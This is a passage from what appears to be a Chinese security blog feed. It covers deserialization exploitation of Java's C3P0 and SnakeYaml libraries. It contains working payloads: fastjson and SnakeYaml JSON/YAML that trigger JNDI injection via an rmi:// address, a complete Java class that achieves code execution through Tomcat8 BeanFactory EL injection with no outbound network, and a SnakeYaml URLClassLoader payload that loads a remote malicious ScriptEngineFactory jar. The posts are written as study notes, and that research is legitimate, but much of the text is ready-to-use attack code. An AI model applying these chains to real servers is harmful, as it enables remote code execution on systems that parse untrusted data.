punctuation">(</span><span class="token class-name">SQLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PropertyVetoException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>思路：jndiRefConnectionPoolDataSource#setJndiName设置jndi的路径，<br>jndiRefConnectionPoolDataSource#setLoginTimeout触发jndi注入</p><p><a name="L2FPH"></a></p><h5 id="fastjson版"><a href="#fastjson版" class="headerlink" title="fastjson版"></a><strong>fastjson版</strong></h5><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource"</span><span class="token punctuation">,</span><span class="token property">"jndiName"</span><span class="token operator">:</span><span class="token string">"rmi://127.0.0.1:8085/RFKMphyY"</span><span class="token punctuation">,</span><span class="token property">"loginTimeout"</span><span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">}</span></code></pre><p><a name="wmUlk"></a></p><h5 id="SnakeYaml版"><a href="#SnakeYaml版" class="headerlink" title="SnakeYaml版"></a><strong>SnakeYaml版</strong></h5><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token tag">!!com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource</span> <span class="token punctuation">{</span><span class="token key atrule">jndiName</span><span class="token punctuation">:</span> <span class="token string">"rmi://127.0.0.1:8085/RFKMphyY"</span><span class="token punctuation">,</span> <span class="token key atrule">loginTimeout</span><span class="token punctuation">:</span> <span class="token string">"2"</span><span class="token punctuation">}</span></code></pre><p>注意空格(踩过坑)</p><p><a name="nEs1R"></a></p><h2 id="HEX二次反序列化"><a href="#HEX二次反序列化" class="headerlink" title="HEX二次反序列化"></a>HEX二次反序列化</h2><p><a name="X8Z6c"></a></p><h3 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h3><p>流程</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment">#设置userOverridesAsString属性值</span>WrapperConnectionPoolDataSource<span class="token comment">#setuserOverridesAsString -&gt;</span>WrapperConnectionPoolDataSourceBase<span class="token comment">#setUserOverridesAsString</span> <span class="token comment">#初始化类时反序列化十六进制字节流</span>WrapperConnectionPoolDataSource<span class="token comment">#WrapperConnectionPoolDataSource -&gt;</span>C3P0ImplUtils<span class="token comment">#parseUserOverridesAsString -&gt;</span>SerializableUtils<span class="token comment">#fromByteArray -&gt;</span>SerializableUtils<span class="token comment">#deserializeFromByteArray -&gt;</span>ObjectInputStream<span class="token comment">#readObject</span></code></pre><p>WrapperConnectionPoolDataSource#setuserOverridesAsString<br>调用父类方法，WrapperConnectionPoolDataSourceBase#setUserOverridesAsString<br>!<img src="/img/2-24/17.png"><br>会获取原来的值和新的值放入另一个方法中<br>进入VetoableChangeSupport#fireVetoableChange<br>继续进入重载方法<br>!<img src="/img/2-24/18.png"><br>然后调用所有listener的vetoableChange方法<br>!<img src="/img/2-24/19.png"><br>当前有一个listener就是WrapperConnectionPoolDataSource<br>进入WrapperConnectionPoolDataSource#vetoableChange<br>!<img src="/img/2-24/20.png"><br>然后调到这里<br>!<img src="/img/2-24/21.png"><br>val就是我们设置的属性值<br>进入C3P0ImplUtils#parseUserOverridesAsString<br>!<img src="/img/2-24/22.png"><br>这里会从默认前缀HexAsciiSerializedMap加上一个字符后开始截取真正的反序列化数据（那么payload就应该加上这个前缀）<br>然后将字符串转为字符数组</p><p>进入SerializableUtils#fromByteArray<br>!<img src="/img/2-24/23.png"><br>进入deserializeFromByteArray<br>!<img src="/img/2-24/24.png"><br>这里就是一个链子结尾，触发了原生的反序列化，readObject，也算是反序列链子的一个入口点，因此可以用这个来进行二次反序列化</p><p><a name="cBnw1"></a></p><h1 id="C3P0不出网利用"><a href="#C3P0不出网利用" class="headerlink" title="C3P0不出网利用"></a>C3P0不出网利用</h1><p>不论是URLClassLoader加载远程类，还是JNDI注入，都需要目标机器能够出网。而加载Hex字符串的方式虽然不用出网，但却有Fastjson等的相关依赖。那么如果目标机器不出网，又没有Fastjson依赖的话，C3P0链又该如何利用呢<br>在JNDI高版本利用中，我们可以加载本地的Factory类进行攻击，而利用条件之一就是该工厂类至少存在一个getObjectInstance()方法。比如通过加载Tomcat8中的org.apache.naming.factory.BeanFactory进行EL表达式注入<br>!<img src="/img/2-24/25.png"><br>我们再回头看C3P0中利用URLClassLoader进行任意类加载的攻击方式<br>!<img src="/img/2-24/26.png"><br>在实例化完我们的恶意类之后，调用了恶意类ObjectFactory.getObjectInstance()。由于可以实例化任意类，所以我们可以将该类设置为本地的BeanFactory类。在不出网的条件下可以进行EL表达式注入，利用方式类似JNDI的高版本绕过。当然了，这种利用方式需要存在Tomcat8相关依赖环境<br><a name="HSnur"></a></p><h3 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h3><p>由于BeanFactory中需要Reference为ResourceRef类，因此在getReference()中我们实例化ResourceRef类，剩下的构造就和高版本JNDI类似了</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml">package C3P0; import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;import org.apache.naming.ResourceRef; import javax.naming.NamingException;import javax.naming.Reference;import javax.naming.Referenceable;import javax.naming.StringRefAddr;import javax.sql.ConnectionPoolDataSource;import javax.sql.PooledConnection;import java.io.<span class="token important">*;</span>import java.lang.reflect.Field;import java.sql.SQLException;import java.sql.SQLFeatureNotSupportedException;import java.util.logging.Logger; public class C3P0_Tomcat8 <span class="token punctuation">{</span>     public static class Tomcat8_Loader implements ConnectionPoolDataSource<span class="token punctuation">,</span> Referenceable <span class="token punctuation">{</span>         @Override        public Reference getReference() throws NamingException <span class="token punctuation">{</span>            ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor"<span class="token punctuation">,</span> (String)null<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean important">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> (String)null);            resourceRef.add(new StringRefAddr("forceString"<span class="token punctuation">,</span> "faster=eval"));            resourceRef.add(new StringRefAddr("faster"<span class="token punctuation">,</span> "Runtime.getRuntime().exec(\"calc\")"));            return resourceRef;        <span class="token punctuation">}</span>         @Override        public PooledConnection getPooledConnection() throws SQLException <span class="token punctuation">{</span>            return null;        <span class="token punctuation">}</span>         @Override        public PooledConnection getPooledConnection(String user<span class="token punctuation">,</span> String password) throws SQLException <span class="token punctuation">{</span>            return null;        <span class="token punctuation">}</span>         @Override        public PrintWriter getLogWriter() throws SQLException <span class="token punctuation">{</span>            return null;        <span class="token punctuation">}</span>         @Override        public void setLogWriter(PrintWriter out) throws SQLException <span class="token punctuation">{</span>         <span class="token punctuation">}</span>         @Override        public void setLoginTimeout(int seconds) throws SQLException <span class="token punctuation">{</span>         <span class="token punctuation">}</span>         @Override        public int getLoginTimeout() throws SQLException <span class="token punctuation">{</span>            return 0;        <span class="token punctuation">}</span>         @Override        public Logger getParentLogger() throws SQLFeatureNotSupportedException <span class="token punctuation">{</span>            return null;        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>     //序列化    public static void Pool_Serial(ConnectionPoolDataSource c) throws NoSuchFieldException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        //反射修改connectionPoolDataSource属性值        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);        Class cls = poolBackedDataSourceBase.getClass();        Field field = cls.getDeclaredField("connectionPoolDataSource");        field.setAccessible(true);        field.set(poolBackedDataSourceBase<span class="token punctuation">,</span>c);         //序列化流写入文件        FileOutputStream fos = new FileOutputStream(new File("exp.bin"));        ObjectOutputStream oos = new ObjectOutputStream(fos);        oos.writeObject(poolBackedDataSourceBase);     <span class="token punctuation">}</span>     //反序列化    public static void Pool_Deserial() throws IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        FileInputStream fis = new FileInputStream(new File("exp.bin"));        ObjectInputStream objectInputStream = new ObjectInputStream(fis);        objectInputStream.readObject();    <span class="token punctuation">}</span>     public static void main(String<span class="token punctuation">[</span><span class="token punctuation">]</span> args) throws IOException<span class="token punctuation">,</span> NoSuchFieldException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        Tomcat8_Loader tomcat8_loader = new Tomcat8_Loader();        Pool_Serial(tomcat8_loader);        Pool_Deserial();    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>注意，由于Tomcat8的EL依赖可能不完整，利用的时候可能会失败，最好依赖下面两个包</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml">&lt;dependency<span class="token punctuation">&gt;</span>    &lt;groupId<span class="token punctuation">&gt;</span>org.apache.tomcat&lt;/groupId<span class="token punctuation">&gt;</span>    &lt;artifactId<span class="token punctuation">&gt;</span>tomcat<span class="token punctuation">-</span>catalina&lt;/artifactId<span class="token punctuation">&gt;</span>    &lt;version<span class="token punctuation">&gt;</span>8.5.0&lt;/version<span class="token punctuation">&gt;</span>&lt;/dependency<span class="token punctuation">&gt;</span>&lt;dependency<span class="token punctuation">&gt;</span>    &lt;groupId<span class="token punctuation">&gt;</span>org.apache.tomcat.embed&lt;/groupId<span class="token punctuation">&gt;</span>    &lt;artifactId<span class="token punctuation">&gt;</span>tomcat<span class="token punctuation">-</span>embed<span class="token punctuation">-</span>el&lt;/artifactId<span class="token punctuation">&gt;</span>    &lt;version<span class="token punctuation">&gt;</span>8.5.15&lt;/version<span class="token punctuation">&gt;</span>&lt;/dependency<span class="token punctuation">&gt;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SnakeYaml反序列化漏洞</title>
      <link href="/2024/01/22/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/01/22/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="SnakeYaml反序列化漏洞"><a href="#SnakeYaml反序列化漏洞" class="headerlink" title="SnakeYaml反序列化漏洞"></a>SnakeYaml反序列化漏洞</h1><p>​SnakeYaml 是java解析yaml格式的组件库，将yaml格式的数据转为java对象称为反序列化，反过来就是序列化。</p><p>漏洞版本： 1.xx</p><p><a name="A4pSC"></a></p><h2 id="Yaml介绍"><a href="#Yaml介绍" class="headerlink" title="Yaml介绍"></a>Yaml介绍</h2><p><strong>特性</strong>：</p><ul><li>大小写敏感</li><li>使用缩进表示层级关系</li><li>缩进不允许使用tab，只允许空格</li><li>缩进的空格数不重要，只要相同层级的元素左对齐即可</li><li>‘#’表示注释</li></ul><p>YAML 支持以下几种数据类型：</p><ul><li>对象：键值对的集合，又称为映射（mapping）/ 哈希（hashes） / 字典（dictionary）</li><li>数组：一组按次序排列的值，又称为序列（sequence） / 列表（list）</li><li>纯量（scalars）：单个的、不可再分的值，就是一些基本数据类型</li></ul><p>SnakeYaml 解析的时候看到的数据类型名字是mapping（映射）,sequence（序列）,scalars（纯量），而不是对象和数组</p><p>在数据前添加   !!全类名 。表示强制转化数据类型。类似于fastjson中的 @type</p><p><a name="tgSBe"></a></p><h2 id="SnakeYaml使用"><a href="#SnakeYaml使用" class="headerlink" title="SnakeYaml使用"></a>SnakeYaml使用</h2><p>导入依赖，springboot项目中自带依赖</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.yaml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>snakeyaml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.27<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span></code></pre><p>首先要new Yaml()<br>再用load,loads,dump,dumps(跟pickle序列化和反序列化一样)</p><p>示例</p><pre class="language-java" data-language="java"><code class="language-java">inputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">;</span>yaml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 使用文件输入流读取YAML文件</span>yamlMap <span class="token operator">=</span> yaml<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><a name="nwcZ9"></a></p><h2 id="反序列化漏洞原理"><a href="#反序列化漏洞原理" class="headerlink" title="反序列化漏洞原理"></a>反序列化漏洞原理</h2><p><a name="MdNuR"></a></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>!!+全类名指定反序列化的类，反序列化过程中会实例化该类。snakeyaml 将全类名解析，并将类使用forname()进行加载，然后通过反射获取构造器，调用构造方法，控制适当的类的构造方法就能进行漏洞攻击</p><p><a name="nwg1g"></a></p><h3 id="解析过程"><a href="#解析过程" class="headerlink" title="解析过程"></a>解析过程</h3><p>下面是一些调试过程，方便理解是如何进解析的，可能大部分内容对于我们的漏洞毫无关系<br></p><p>！！！ 值得注意的是这里调式的数据类型是数组，其他数据稍有不同</p><h4 id="sequence类型反序列化过程调试代码"><a href="#sequence类型反序列化过程调试代码" class="headerlink" title="sequence类型反序列化过程调试代码:"></a>sequence类型反序列化过程调试代码:</h4><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">String</span> context <span class="token operator">=</span> <span class="token string">"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://7c6yh7.dnslog.cn\"]]]]\n"</span><span class="token punctuation">;</span><span class="token class-name">Yaml</span> yaml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>yaml<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>new Yaml()初始化：大概就是初始化一些构造器，和一些解析规则</p><p>load的过程：</p><p><a name="l5INl"></a></p><h5 id="1-初始化部分："><a href="#1-初始化部分：" class="headerlink" title="1.初始化部分："></a>1.初始化部分：</h5><p>根据输入创建流，和传入Object.class，表示返回一个Object<br><img src="/img/1-22/1.png"><br></p><p>进入loadFromReader</p><img src="/img/1-22/21.png"><p>在ParserImpl中对sreader做了相关的处理映射；追进去看一下；利用重载拿到相关映射；</p><img src="/img/1-22/22.png"><p>然后new Composer加载默认配置并解析开头和结尾的位置</p><p><a name="mE9Al"></a></p><h5 id="2-解析节点"><a href="#2-解析节点" class="headerlink" title="2.解析节点"></a>2.解析节点</h5><p>然后getSingleNode()将整个yaml数据解析成多个节点，，注意的是在解析节点过程中composeNode方法和composeSequenceNode方法（数据是Sequence类型）相互调用形成递归，这样就递归解析到每个节点。</p><p>最终解析完多重嵌套的数据</p><p><img src="/img/1-22/2.png"><br>然后每一个节点的类型，或者是全类名加上默认的前缀，就是一个tag<br><img src="/img/1-22/3.png"></p><p>然后进入constructDocument方法，再进入constructObject方法。这是因为yaml数据可能是多个部分</p><p>constructObject中会判断是否已经被解析，即在缓存hashmap是否已存在，然后继续构造</p><p><a name="cd4ML"></a></p><h5 id="3-获取构造器和进行类加载"><a href="#3-获取构造器和进行类加载" class="headerlink" title="3.获取构造器和进行类加载"></a>3.获取构造器和进行类加载</h5><blockquote><p>这里的构造器是SnakeYaml中设置的构造器，而不是我们设置的类构造器</p></blockquote><p>构造器初始化：</p><p>getConstructor从节点node中获取构造器,首先会从yamlConstructors中获取构造器（new Yaml时候创建的），yamlConstructors里面是yaml中13中数据类型对应的构造器<br><img src="/img/1-22/4.png"><br>很显然我们最外层的javax.script.ScriptEngineManager并不是基本的数据类型，就是返回默认的构造器，就是上面13个里面的null类型</p><p>然后是再检查缓存中是否有构造器，很显然是没有的，进入construct方法<br><img src="/img/1-22/5.png"><br>有时候挺想吐槽，<br>再次调用getConstructor方法和construct方法。只不过这次getConstructor方法是Constructor类中的方法，跟上面的不同（BaseConstructor,细品）</p><p>在这个getConstructor方法中，他进行了类加载，并且重新设置了type<br><img src="/img/1-22/6.png"></p><p>类加载：<br>从tag中去除前缀，拿到全类名，进入forName进行类加载，这里类加载进行了初始化，那么被加载的类中的静态代码块可以执行。从主线程拿到应用加载器进行加<img src="/img/1-22/7.png"></p><p>最终还是从yamlClassConstructors中拿到的构造器。也就是Sequenced的构造器<br><img src="/img/1-22/8.png"></p><p><a name="ufLhq"></a></p><h5 id="4-反射构造"><a href="#4-反射构造" class="headerlink" title="4.反射构造"></a>4.反射构造</h5><p>进入Sequence构造器的construct方法中。首先会获取类构造器<br><img src="/img/1-22/9.png"><br>上面代码获取构造方法的大致流程：</p><ol><li>获取全面的类构造器</li><li>循环遍历，拿到参数个数与node节点value个数相同的类构造方法（这里我们有一个元素的嵌套，相当于是有一个参数）</li><li>获取那些构造方法的参数类型与node的value同类型的构造方法 （参数类型是ClassLoader类加载器，刚好里面一层是URLClassLoader类加载器）</li><li>如果满足条件的有多个构造器，取第一个</li></ol><p>根据我们的payload。会拿到这个方法。<br><img src="/img/1-22/10.png"></p><p>上面过程中会对node的value递归调用constructorObject方法（最开始还没找到是这里递归了），这样就把payload从最里面的字符串构造出来后再回到上一层构造方法中。把参数列表构造出来了。</p><p>当不是递归时或者是最里层，会通过反射newInstance实例对象<br><img src="/img/1-22/11.png"></p><p>上面过程可以看出SnakeYaml中会经常有递归。</p><p>上面最后调用的方法ScriptEngineManager(ClassLoader loader)涉及java中的SPI机制</p><p><a name="syXDk"></a></p><h4 id="mapping类型反序列化过程"><a href="#mapping类型反序列化过程" class="headerlink" title="mapping类型反序列化过程"></a><strong>mapping类型反<strong><strong>序列化</strong></strong>过程</strong></h4><p>mapping数据类型对应javaBean对象，大致跟上面相同，不同的是会同fastjson一样会调用setter方法。</p><p>调式过程就省略了,攻击链可以参考fastjson的</p><p>可以参考这位师傅的文章：<a href="https://s1mple-top.github.io/2022/03/26/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Java SnakeYaml反序列化漏洞 | s1mple</a></p><h2 id="SPI机制"><a href="#SPI机制" class="headerlink" title="SPI机制"></a>SPI机制</h2><blockquote><p>SPI机制在其中的一条攻击链中利用到</p></blockquote><p><a name="fVNWU"></a></p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>SPI（Service Provider Interface），是JDK内置的一种 服务提供发现机制，可以用来启用框架扩展和替换组件，主要是被框架的开发人员使用，比如java.sql.Driver接口，其他不同厂商可以针对同一接口做出不同的实现，MySQL和PostgreSQL都有不同的实现提供给用户，而Java的SPI机制可以为某个接口寻找服务实现。Java中SPI机制主要思想是将装配的控制权移到程序之外，在模块化设计中这个机制尤其重要，其核心思想就是 <strong>解耦</strong>。<br>SPI整体机制图如下：<br><img src="/img/1-22/12.png"><br>当服务的提供者提供了一种接口的实现之后，需要在classpath下的META-INF/services/目录里创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体的实现类。当其他的程序需要这个服务的时候，就可以通过查找这个jar包（一般都是以jar包做依赖）的META-INF/services/中的配置文件，配置文件中有接口的具体实现类名，可以根据这个类名进行加载实例化，就可以使用该服务了。JDK中查找服务的实现的工具类是：java.util.ServiceLoader</p><p><strong>实现细节</strong>：程序会java.util.ServiceLoder动态装载实现模块，在META-INF/services目录下的配置文件寻找实现类的类名，通过Class.forName加载进来,newInstance()反射创建对象,并存到缓存和列表里面。</p><p><a name="VqaSn"></a></p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>我们现在需要使用一个内容搜索接口，搜索的实现可能是基于文件系统的搜索，也可能是基于数据库的搜索。</p><ul><li><p>先定义好接口</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Search</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> <span class="token function">searchDoc</span><span class="token punctuation">(</span><span class="token class-name">String</span> keyword<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span></code></pre></li><li><p>文件搜索实现</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FileSearch</span> <span class="token keyword">implements</span> <span class="token class-name">Search</span><span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> <span class="token function">searchDoc</span><span class="token punctuation">(</span><span class="token class-name">String</span> keyword<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"文件搜索 "</span><span class="token operator">+</span>keyword<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li><li><p>数据库搜索实现</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DatabaseSearch</span> <span class="token keyword">implements</span> <span class="token class-name">Search</span><span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> <span class="token function">searchDoc</span><span class="token punctuation">(</span><span class="token class-name">String</span> keyword<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"数据搜索 "</span><span class="token operator">+</span>keyword<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li><li><p>resources 接下来可以在resources下新建META-INF/services/目录，然后新建接口全限定名的文件：com.cainiao.ys.spi.learn.Search，里面加上我们需要用到的实现类</p><pre class="language-markup" data-language="markup"><code class="language-markup">com.cainiao.ys.spi.learn.FileSearch</code></pre></li><li><p>测试方法</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestCase</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">ServiceLoader</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Search</span><span class="token punctuation">&gt;</span></span> s <span class="token operator">=</span> <span class="token class-name">ServiceLoader</span><span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token class-name">Search</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Iterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Search</span><span class="token punctuation">&gt;</span></span> iterator <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token class-name">Search</span> search <span class="token operator">=</span>  iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           search<span class="token punctuation">.</span><span class="token function">searchDoc</span><span class="token punctuation">(</span><span class="token string">"hello world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>可以看到输出结果：文件搜索 hello world<br>如果在com.cainiao.ys.spi.learn.Search文件里写上两个实现类，那最后的输出结果就是两行了。<br>这就是因为ServiceLoader.load(Search.class)在加载某接口时，会去META-INF/services下找接口的全限定名文件，再根据里面的内容加载相应的实现类。<br>这就是spi的思想，接口的实现由provider实现，provider只用在提交的jar包里的META-INF/services下根据平台定义的接口新建文件，并添加进相应的实现类内容就好。</p></li></ul><p><a name="A1jUC"></a></p><h3 id="ScriptEngineManager类"><a href="#ScriptEngineManager类" class="headerlink" title="ScriptEngineManager类"></a><strong>ScriptEngineManager类</strong></h3><p>这个类就是java调用其他编程语言的类，jdk6引入，默认自带javascript的引擎，使用SPI机制<br><strong>ScriptEngineManager</strong> 类是 Java 中 javax.script 包中的一个类，它提供了一种标准的框架，用于在 Java 程序中执行脚本语言。这个框架的目标是让 Java 与其他脚本语言（如JavaScript、Python等）进行交互变得更加容易。</p><p><a name="Nlkbl"></a></p><h2 id="ScriptEngineManager攻击链"><a href="#ScriptEngineManager攻击链" class="headerlink" title="ScriptEngineManager攻击链"></a><strong>ScriptEngineManager攻击链</strong></h2><p><a name="GUp03"></a></p><h3 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h3><p>我们上面的payload只是进行了dnslog进行漏洞验证，现在来编写exp和继续调式分析</p><p>思路：根据SPI机制，和ScriptEngineManger就是SPI机制的实现，那么exp就是SPI机制中的服务提供者，编写恶意类实现相关接口，并在META-INF目录下的services目录下创建相关接口名称的文件，写上我们的恶意类的全类名，最后开启一个http服务，放置我们恶意的jar包</p><p>进入上面最后的init方法中的initEngines方法中，可以看到ServiceLoad<scriptenginefactory><br><img src="/img/1-22/13.png"><br>那么加载的就是那些实现了ScriptEngineFactory接口的服务，那恶意类实现ScriptEngineFactory接口<br></scriptenginefactory></p><p>新建项目<br>编写恶意类：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span><span class="token class-name">ScriptEngine</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span><span class="token class-name">ScriptEngineFactory</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> exp <span class="token keyword">implements</span> <span class="token class-name">ScriptEngineFactory</span> <span class="token punctuation">{</span><span class="token keyword">static</span> <span class="token punctuation">{</span><span class="token keyword">try</span> <span class="token punctuation">{</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token 